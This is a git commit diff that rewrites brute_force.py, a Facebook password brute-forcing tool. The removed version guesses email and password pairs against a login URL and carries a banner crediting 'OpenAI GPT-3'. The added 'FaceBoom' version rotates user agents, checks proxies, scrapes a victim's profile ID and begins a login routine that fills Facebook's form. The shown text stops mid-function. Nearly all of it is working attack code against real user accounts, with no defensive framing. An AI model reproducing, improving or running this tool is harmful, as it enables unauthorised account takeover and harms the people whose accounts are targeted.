e26c358a121a0155b0453745c85981ae126886d0
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2024-01-27 20:46:04 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,97 +1,78 @@
-import time
-import requests
+#!/usr/bin/python
+
+import socket
 import sys
+import os
+import re
 import random
+import optparse
+import time
+import io
 
-WAIT_TIME = 3
-PASSWD_PER_REQUEST = 1000
-DELAY_RANGE = (2, 3)
+try:
+    import requests
+except ImportError:
+    print("\033[1;31m\n[!\033[1;33m!\033[1;31m] Error: \033[1;33m[ requests ]\033[1;31m module is missing\033[1;37m")
+    print("  [*] Please Use: 'pip install requests' to install it :)")
+    sys.exit(1)
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+try:
+    import mechanize
+except ImportError:
+    print("\033[1;31m\n[!\033[1;33m!\033[1;31m] Error: \033[1;33m[ mechanize ]\033[1;31m module is missing\033[1;37m")
+    print("  [*] Please Use: 'pip install mechanize' to install it :)")
+    sys.exit(1)
 
-def banner(argv, usage=False, url=None, emails=None):
-    print(bcolors.OKBLUE + " __      __                        .___                             " + bcolors.ENDC)
-    print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
-    print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
-    print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
-    print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
-    print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
-    print(bcolors.OKBLUE + "" + bcolors.ENDC)
-    print(bcolors.OKBLUE +
-          "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
-    print(bcolors.OKBLUE +
-          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
-    print(bcolors.OKBLUE +
-          '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\__|__' + bcolors.ENDC)
-    print(bcolors.OKBLUE + "" + bcolors.ENDC)
-    print("")
-    print(bcolors.OKBLUE +
-          "+ -- --=[Facebook Brute Force Exploit by OpenAI GPT-3" + bcolors.ENDC)
-    if usage:
-        print(bcolors.OKBLUE +
-              "+ -- --=[Usage: %s http://facebook.com/login.php passwords.txt email [email2] [email3]..." % (argv[0]) + bcolors.ENDC)
-        sys.exit(0)
-    else:
-        print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
-              url + " with emails: " + str(emails) + "" + bcolors.ENDC)
+class FaceBoom(object):
+    def __init__(self):
+        self.useProxy = None
+        self.br = mechanize.Browser()
+        self.br.set_handle_robots(False)
+        self.br._factory.is_html = True
+        self.br.addheaders = [('User-agent', random.choice([
+            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
+            'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
 
-def send_request(url, data):
-    req = requests.post(url, data.encode('utf-8'))
-    rsp = req.content.decode('utf-8')
-    return rsp
+    @staticmethod
+    def check_proxy(proxy):
+        proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
+        proxy_ip = proxy.split(":")[0]
+        try:
+            r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
+            if proxy_ip == r.headers['X-Client-IP']:
+                return True
+            return False
+        except Exception:
+            return False
 
-def template(entries):
-    t = 'email=%s&pass=%s'
-    return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])
+    @staticmethod
+    def cnet():
+        try:
+            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
+            return True
+        except socket.error:
+            pass
+        return False
 
-def attack(entries, url):
-    if len(entries) < 1:
-        return
+    def get_profile_id(self, target_profile):
+        try:
+            print("\033[1;32m\n[\033[1;37m*\033[1;32m] geting target Profile Id... please wait\033[1;37m")
+            idre = re.compile('(?<="userID":").*?(?=")')
+            con = requests.get(target_profile).text
+            idis = idre.search(con).group()
+            print("\033[1;37m\n[\033[1;32m+\033[1;37m] \033[1;32mTarget Profile\033[1;37m ID: \033[1;33m{}\033[1;37m".format(idis))
+        except Exception:
+            print("\033[1;31m[!\033[1;33m!\033[1;31m] Error: Please Check Your Victim's Profile URL\033[1;37m")
+            sys.exit(1)
 
-    t = template(entries)
-    response = send_request(url, t)
-
-    # Check if any successful logins were found
-    for entry in entries:
-        if "Welcome to Facebook" in response:
-            print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
-            print(bcolors.OKGREEN + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
-        else:
-            print(bcolors.FAIL + "Login failed!" + bcolors.ENDC)
-            print(bcolors.FAIL + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
-
-def brute_force(url, passwords, emails):
-    entries = []
-
-    for email in emails:
-        for password in passwords:
-            entries.append({'email': email, 'passwd': password})
-            if len(entries) >= PASSWD_PER_REQUEST:
-                attack(entries, url)
-                entries = []
-
-    # Attack remaining entries
-    attack(entries, url)
-
-if __name__ == "__main__":
-    if len(sys.argv) < 4:
-        banner(sys.argv, usage=True)
-
-    url = sys.argv[1]
-    passwords_file = sys.argv[2]
-    emails = sys.argv[3:]
-
-    with open(passwords_file, 'r') as file:
-        passwords = [line.strip() for line in file]
-
-    banner(sys.argv, url=url, emails=emails)
-
-    brute_force(url, passwords, emails)
+    def login(self, target, password):
+        try:
+            self.br.open("https://facebook.com")
+            self.br.select_form(nr=0)
+            self.br.form['email'] = target
+            self.br.form['pass'] = password
